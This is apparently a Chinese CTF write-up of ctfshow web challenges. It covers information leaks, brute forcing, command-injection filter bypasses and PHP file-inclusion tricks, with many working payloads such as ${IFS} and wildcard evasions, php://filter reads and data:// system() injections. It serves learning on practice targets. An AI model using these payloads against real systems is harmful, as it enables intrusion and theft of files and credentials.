# Web入门

**Web方向主打的就是一个经验积累。**

## 信息搜集（AK）

### web1

启动靶机，进入环境，提示“开发注释没有删除干净”，尝试打开F12，发现了flag

![](.\信息收集\图片\web1.png)



### web2

提示：js前台拦截 === 无效操作

启动靶机，进入环境，显示无法查看源代码，按F12确实没用。

但是，有一个view-source:协议是浏览器无法过滤的，利用它查看到源代码。

并且得到flag

![](.\信息收集\图片\web2.png)



### web3

提示：没思路的时候抓个包看看，可能会有意外收获

此处需要抓包软件，目前推荐的**BurpSuite**，有能力搞个专业版最好，社区版锁了算力。

启动靶机，进入环境，抓个包先，先不管发出去的。

等靶机响应时BurpSuite有了反应，查看具体内容，发现flag就藏在响应中。解决了

![](.\信息收集\图片\web3.png)



### web4

总有人把后台地址写入robots，帮黑阔大佬们引路。

看来需要后台了，先使用dirsearch扫一遍目录，结果如下

![](.\信息收集\图片\web4\扫目录.png)

有一个robots.txt可供他人访问，这也与提示相符。

尝试访问得到内容：

```
User-agent: *
Disallow: /flagishere.txt
```

说明不限制浏览器，但不允许爬取flagishere.txt，那我自己访问总没事了吧。你问我怎么知道这个东西的？你自己告诉我的。

![](.\信息收集\图片\web4\拿下.png)



### web5

phps源码泄露有时候能帮上忙

启动靶机，进入环境，先扫一下phps看有什么东西没有

还真找到了

![](.\信息收集\图片\web5\找到你了.png)

然后访问它，发现文件被下载下来了。

打开就能够得到flag

![](.\信息收集\图片\web5\找到flag.png)



### web6

解压源码到当前目录，测试正常，收工

本题考查源码泄露

那还用说吗？扫一下压缩包，看有没有尚未被删除的备份。

果然找到了，一般都以www.zip或者WWW.zip标明

![](.\信息收集\图片\web6\泄露源码.png)

访问它，将它下载下来。

里面有一个index.php，注释写明flag在另一个文件里面，这就得到了flag，记得弄到网上访问它！

![](.\信息收集\图片\web6\最终结果.png)



### web7

版本控制很重要，但不要部署到生产环境更重要。

这里主要指的是**版本控制软件**git和svn，说明一会儿又要扫目录了。

很好，刚开始扫描就发现.git的重定向了，即访问.git会自动重定向到它的存档里面。

访问即可得到flag

![](.\信息收集\图片\web7.png)



### web8

版本控制很重要，但不要部署到生产环境更重要。

同web7，扫一下发现了.svn

访问得到flag



![](.\信息收集\图片\web8.png)



### web9

发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了

> vim在进行文件读写时第一次会生成.swp文件，因意外退出后会产生.swo文件，再出现意外会生成.swn文件，而这些文件在意外退出等情况下不会被删除。因此可以用它们得到信息。

访问index.php.swp，发现文件下载下来了，打开发现flag

![](.\信息收集\图片\web9.png)



### web10

cookie 只是一块饼干，不能存放任何隐私数据

那就把cookie弄到手，BurpSuite,启动！

flag就在set-cookie值中。

![](.\信息收集\图片\web10.png)



### web11

域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息

域名信息需要域名解析服务器告诉我们，所以我们需要问DNS。

同时，题目中写了是txt记录，也就是我们需要确定查询范围

在cmd中输入nslookup -type=txt flag.ctfshow.com即可得到flag

![](.\信息收集\图片\web11.png)



### web12

有时候网上的公开信息，就是管理员的常用密码

进入靶机，是一个网站，先扫目录

![](.\信息收集\图片\web12\目录扫描结果.png)

看来可利用的部分为admin（401状态，说明服务器需要认证身份）和robots.txt

先访问robots.txt，这里信息

```
User-agent: *
Disallow: /admin/
```

也表示admin目录是一个非常重要的东西。

直接访问发现不知道密码和用户名，根据提示，用户名猜admin，密码猜网站最底下的联系电话。

通过了，拿到flag

![](.\信息收集\图片\web12\得到flag.png)



### web13

技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码

社会工程学快乐题

扫个目录发现几乎全部都要认证，得找一下口令，那想都不要想，找文档

然后网站底部有个document，把它下载下来后发现最后一页附上了登陆后台和账号密码。

登陆就拿到flag了。

![](.\信息收集\图片\web13.png)



### web14

有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人

启动靶机，进入环境。输入/editor查看编辑器。这个编辑器上传文件时直接访问了服务器自身的目录。

找吧找吧。在var/www/html目录 中，存在 一个nothinghere有一个文件 fl000g.txt 直接访问这个fl000g.txt 即可获得flag!

![](.\信息收集\图片\web14.png)







### web15

公开的信息比如邮箱，可能造成信息泄露，产生严重后果

又是社会工程学问题

先扫描目录，发现有个/admin

访问/admin页面 发现有一个忘记密码操作，需要输入地址 在主页面下面看到QQ邮箱，通过QQ号查询邮箱，是西安的 修改密码成功，用户名 admin 登录成功获得flag



### web16

对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露

启动靶机，进入环境，在url后面加上/tz.php，进入探针，查看phpinfo，在里面找到flag

![](.\信息收集\图片\web16.png)



### web17

备份的sql文件会泄露敏感信息

那就寻找sql文件的备份，扫描目录发现有个backup.sql

下载下来打开即可找到flag

![](.\信息收集\图片\web17.png)



### web18

不要着急，休息，休息一会儿，玩101分给你flag

你赢了，去幺幺零点皮爱吃皮看看

然后得到了flag

![](.\信息收集\图片\web18.png)



### web19

密钥什么的，就不要放在前端了

F12看一下，真就看到密钥了

```
 /**

   * Shortcut functions to the cipher's object interface.

        * @example

             *     var ciphertext = CryptoJS.AES.encrypt(message, key, cfg);
                      *     var plaintext  = CryptoJS.AES.decrypt(ciphertext, key, cfg);
                                 */
```

AES加密

找齐所有要素后进行解密，得到password = i_want_a_36d_girl，成分复杂的东西。

行吧，登录拿flag

![](.\信息收集\图片\web19.png)



### web20

mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。

这个文件放在/db/db.mdb里面

下载下来打开即可得到flag



## 爆破

### web21

启动靶机，进入环境，发现要登陆

先随便输入点什么进去，抓包，发现多了一行信息

```
Authorization: Basic MTIzNDU2OjEyMzQ1Ng==
```

将后面的编码进行解密后发现是123456:123456，这正是我刚刚输入进去的用户名:密码组合。

接下来对其进行爆破

payloadtype选Custom iterrator，position1填admin，position2填: ,position3导入字典

将字典导入后，记得base64编码

最后会得到一个状态为200的结果，重放它。

得到flag

![](.\爆破\图片\web21.png)



### web22

爆破子域名，Maltego等工具随便用一个就是了



### web23

首先，他需要爆破

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 11:43:51
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 11:56:11
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
error_reporting(0);

include('flag.php');
if(isset($_GET['token'])){
    $token = md5($_GET['token']);
    if(substr($token, 1,1)===substr($token, 14,1) && substr($token, 14,1) ===substr($token, 17,1)){
        if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))){
            echo $flag;
        }
    }
}else{
    highlight_file(__FILE__);

}
?>

```



照葫芦画瓢写个爆破脚本

```
<?php
    for ($i = 1; $i <= 5000; $i++){
        $token = md5($i);
        if (substr($token, 1, 1) === substr($token, 14, 1) && substr($token, 14, 1) === substr($token, 17, 1)) {
            if((intval(substr($token, 1,1)) + intval(substr($token, 14,1)) + substr($token, 17,1)) / substr($token, 1,1) === intval(substr($token, 31,1))){
                echo $i;
            }
            }
        }
?>
```



将其执行后显示的结果为422，这就是我们需要的值

payload:?token=422

获得flag

![](.\爆破\图片\web23.png)

### web24

先看源代码：

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 13:26:39
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 13:53:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
include("flag.php");
if(isset($_GET['r'])){
    $r = $_GET['r'];
    mt_srand(372619038);
    if(intval($r)===intval(mt_rand())){
        echo $flag;
    }
}else{
    highlight_file(__FILE__);
    echo system('cat /proc/version');
}
```

代码中包含了flag.php，并接受了一个名为r的GET请求，接下来就是随机数的计算，如果随机数生成相等就给flag，没有就给你系统版本号。

编写爆破脚本

```
<?php
        echo mt_srand(372619038);
?>
```

payload:?r=1155388967



### web25

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 13:56:57
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 15:47:33
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


error_reporting(0);
include("flag.php");
if(isset($_GET['r'])){
    $r = $_GET['r'];
    mt_srand(hexdec(substr(md5($flag), 0,8)));
    $rand = intval($r)-intval(mt_rand());
    if((!$rand)){
        if($_COOKIE['token']==(mt_rand()+mt_rand())){
            echo $flag;
        }
    }else{
        echo $rand;
    }
}else{
    highlight_file(__FILE__);
    echo system('cat /proc/version');
}
```

需要一个rand，使它的值和随机值相等，若名为token的cookie等于两次随机数之和。就给flag.

需要使用php_mt_seed推断种子。

### web26



## 命令执行

**贴出的源代码均已去掉注释，太影响排版了**

### web29

命令执行，需要严格的过滤

贴上网站源代码

```
<?php



error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

原理分析：获得一个名为”c“的GET请求，若这个请求中没有”flag“字样，则将这个GET请求当作一段PHP命令直接执行。

首先考虑扫一下目录，发现了一个flag.php可以直接访问，然而网站的过滤不允许。

先构建?c=phpinfo();调出了php介绍页面，发现PHP版本为7.3.11。同时服务器使用的是linux系统。这里没有找到flag。

先考虑使用system函数实现命令的执行，构造?c=system("ls");作为测试，发现成功了，网站给出可执行的文件分别为index.php和flag.php，其中默认显示的为index.php。

对于flag.php的访问，可以考虑使用f*，或者在linux系统下插入’‘，”“，\ ("\ "可能会被浏览器强行改为/，小心)来实现绕过。

接下来尝试使用?c=echo `tac f""lag.php`;成功得到flag

参考payload:?c=echo `tac f""lag.php`;

#### web29更好的解法

如果选择将flag.php内容先复制到另一个文件里，然后再直接访问这个文件，可以得到一个排版更好的内容。

参考payload:?c=echo `cp f* 1.txt`;然后直接访问1.txt即可。





### web30

命令执行，需要严格的过滤

本次flag、system和php被过滤了。

```
<?php



error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

说明执行系统命令得使用其他的替代品，比如说echo ``，passthru等。

以**web29更好的解法**同样的原理，构造?c=echo `cp f* 1.txt`;然后直接访问1.txt即可得到flag

或者说，也可以?c=echo `tac f""lag.p""hp`;

不上图了，跟web29差不多。



### web31

这一次增加了cat,sort,shell,'.'和空格的过滤

**空格可以用tab代替，输入其URL编码%09，'.'同理**

```
<?php



error_reporting(0);
if(isset($_GET['c'])){
  $c = $_GET['c'];
  if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
    eval($c);
  }

}else{
  highlight_file(__FILE__);
}
```

payload：?c=echo%09`tac%09f*`;

直接出答案，或者**复制后再访问**的思路也可以，但攻防的时候这样干确定不会被蓝队抓个正着吗？

同时如果复制的文件不写扩展名，需要下载下来用记事本查看。



### web32

很好，这次额外禁用了echo，内联和分号还有引号。看来**传统的命令执行是不行了**。

目前各位师傅的wp里面写的是文件包含，但用这个方法的话我要下一个专题有何用？

因此这里有一位师傅给出了回答：等后来学会了文件包含再来做这个。

payload：?c=include%09$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php

这样可以利用伪协议得到flag.php的base64编码，前面的部分先闭合了上一个函数进行**逃逸**并将舞台留给伪协议。

```
<?php

error_reporting(0);
if(isset($_GET['c'])){
  $c = $_GET['c'];
  if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
    eval($c);
  }

}else{
  highlight_file(__FILE__);
}
```



### web33

这次双引号被过滤了，还是得逃逸外加文件包含。

payload:?c=include%09$_GET[0]?>&0=php://filter/read=convert.base64-encode/resource=flag.php

payload:?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php

```
<?php
error_reporting(0);
if(isset($_GET['c'])){
  $c = $_GET['c'];
  if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
    eval($c);
  }

}else{
  highlight_file(__FILE__);
}
```



### web34

放上源码

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:29
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

需要一个名称为“c”的GET请求，通过正则匹配的判断后即可执行命令

目前可用的执行函数有：passthru()

目前可用的读取函数有：tac, more, less, tail

空格和分号均被过滤了。

尝试逃逸加文件包含

?c=include%09$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php

成功，拿到flag。



### web35

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:23
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

同web34进行逃逸和文件包含

?c=include%09$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php



### web36

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:16
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

他这次把数字给禁用了

?c=include%09$_GET[a]?>&a=php://filter/convert.base64-encode/resource=flag.php



### web37

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 05:18:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

文件包含，由于过滤了flag，不能用php协议，所以用data://text/plain解决，绕开过滤用正则

?c=data://text/plain,<?php system("tac f*");?>

得到flag



### web38

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 05:23:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

增加了对php的过滤，然而没什么用

?c=data://text/plain,<?=system("tac f*");?>



### web39

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:13:21
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
}
```

收到一个名为c的GET请求，然后如果里面没有flag，那就给它后面加个.php包含它,其实如果结尾闭合了可以不管这个尾巴。

payload:

?c=data://text/plain,<?=system("tac%20f*");?>



### web40

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:03:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/


if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```

搁这全武行呢？过滤了数字，~，`，@，#，$，%，^，&，*，()，-，=，+，{}，[]……

个人评价是：?c=echo%20highlight_file(next(array_reverse(scandir(pos(localeconv())))));

什么嘛，那是中文括号，吓我一跳。



### web41

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: 羽
# @Date:   2020-09-05 20:31:22
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:40:07
# @email: 1341963450@qq.com
# @link: https://ctf.show

*/

if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval("echo($c);");
    }
}else{
    highlight_file(__FILE__);
}
?>
```

POST请求，上bp

本题给出了一个脚本，可用于从ASCII中从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符。

用那个脚本即可得到结果，与此同时，如果以后还有**没有过滤或运算**的命令执行时，均可以用它来生成可执行结果并跑出结果。

![](.\命令执行\web41.png)

脚本已同步于Github的script仓库中。



### web42

> 关于shell的重定向命令
>
> 标准输入，值为0，从磁盘获得输入
>
> 标准输出，值为1，输出到屏幕
>
> 错误输出，值为2，输出到屏幕
>
> 对应着/proc/self/fd/**x**，**x**为上面对应的值

现在看题，重点在于> /dev/null 2>&1

/dev/null为linux系统回收站，数据会被直接丢弃

2>&1则是将错误输出重定向到标准输出，如此一来便不会回显到显示器上。

所以采用命令把flag打印出来，利用；分隔分化一下命令，如此便能使其回显出来。

本题中输入?c=ls;ls，显示文件目录

?c=tac flag.php;ls，拿到flag



### web43

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:32:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次不许有分号，也不许有cat。tac不受影响，分号的分化分割作用可以用||代替。

payload:?c=tac flag.php ||



### web44

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:32:01
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/;|cat|flag/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

新增对flag的过滤，那就先正则匹配

payload:?c=tac f* ||



### web45

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:35:34
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次加了一个空格。空格可以用url编码的TAB代替，即%09

payload:?c=tac%09f*||



### web46

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:50:19
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次增加了对数字,$和*的过滤。

payload:?c=tac%09fla''g.php||



### web47

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:59:23
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

啊这……tac无所畏惧

payload:?c=tac%09fl''ag.php||



### web48

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:06:20
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

小老弟你怎么回事？

payload:?c=tac%09fl''ag.php||



### web49

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:22:43
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

payload:?c=tac%09fl''ag.php||

这tac是犯了天条吗？几乎没见着过滤它的。



### web50

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:32:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次原先的payload终于没用了，好耶！

然后发现tac依旧坚挺，倒下的是%09，尝试使用%0C取代，不行，换<试试？行了

payload:?c=tac<fla''g.php||



### web51

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:42:52
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

无敌的tac倒下了，但是<没有倒下，||也没有倒下！

payload:?c=nl<fl''ag.php||

成功自行构造出官解，然而记得看源代码，这题没有回显。



### web52

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:50:30
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次<被过滤了。

        cat${IFS}flag.txt
        cat$IFS$9flag.txt
        cat<flag.txt
        cat<>flag.txt
        ca\t fl\ag
        kg=$ '\x20flag.txt' &&cat$kg
        (\x20 转换成字符串就是空格，这里通过变量的方式巧妙绕过)
来来来，百科全书，上

payload：?c=nl$IFS/fl%27%27ag||

为什么不要php，没搞懂。



### web53

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 18:21:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
}
```

<br>空标签，意味着换行。也就是说会出现原指令的名字。

?c=ls查看发现有flag.php和readflag？

都尝试打开试试

?c=t''ac${IFS}fla''g.p''hp



### web54

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 19:43:42
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

过滤了很多命令。中间这些个很多的星号的内容，其实是说，含有cat,more这样的会被匹配，如cat 那么ca323390ft或c232fa3kdfst, 凡是按序出现了cat 都被匹配。 这时，我们不能直接写ca?因为这样是匹配不到命令的。只能把全路径写出来，如/bin/ca?,与/bin/ca?匹配的，只有/bin/cat命令，这样就用到了cat 命令了。

空格依旧用${IFS}代替。先ls查看一下，发现目标文件flag.php

然后构建查看flag.php的payload：?c=/bin/?at${IFS}f???????

请注意，它只是执行了但没有回显结果，需要自己看源代码



### web55

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 20:03:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

由于过滤了字母，但没有过滤数字，我们尝试使用/bin目录下的可执行程序。

但因为字母不能传入，我们需要使用通配符?来进行代替

?c=/bin/base64 flag.php

替换后变成

?c=/???/????64 ????.???

谜语人滚出CTF！

还真的得到了base64编码，但这种纯靠猜的题目建议扔秦岭喂大熊猫



### web56(未完成)

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

它这次把数字也过滤了……



## 文件包含

文件包含系列开始

### web78

网站源码为：

```
<?php



if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
}
```

没有任何的过滤

可见对于一个名为“file”的GET请求，会以include的形式去执行，那这个地方尝试使用php伪协议

payload：?file=php://filter/convert.base64-encode/resource=flag.php

再一次获得flag.php的base64编码

解码即可得到flag



### web79

这一次出现了过滤，会将php自动转换为 ???从而使php伪协议失效

换别的协议吧，比如说data://,file://。

```
<?php



if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

构造payload:?file=data://text/plain,<?=system('tac flag*');?>

原理：利用data协议直接让其执行命令。



### web80

这一次的过滤有php和data，那就只能用别的伪协议了，压缩的那几个肯定不用了。那只剩一个file了。

但是**file只能够读取本地文件**，我要它有何用啊？

说明这里根本就不是绕过关键词，而是绕过过滤。

思路，更改大小写来绕过。

```
<?php

if(isset($_GET['file'])){
  $file = $_GET['file'];
  $file = str_replace("php", "???", $file);
  $file = str_replace("data", "???", $file);
  include($file);
}else{
  highlight_file(__FILE__);
}
```

payload:?file=PHP://input,然后需要构建POST请求。此处使用到BurpSuite，

构建<?php system("ls");?>输入即可得到文件遍历目录。

这个网站里面有fl0g.php index.php两个文件，当然我们不能直接访问得到。

那就再来一次。

payload:?file=PHP://input，POST：<? php system("tac f*");?>

这次得到了flag



### web81

吊毛，这次把冒号过滤掉了，那就用url编码%3A代替。

```
<?php

if(isset($_GET['file'])){
  $file = $_GET['file'];
  $file = str_replace("php", "???", $file);
  $file = str_replace("data", "???", $file);
  $file = str_replace(":", "???", $file);
  include($file);
}else{
  highlight_file(__FILE__);
}
```

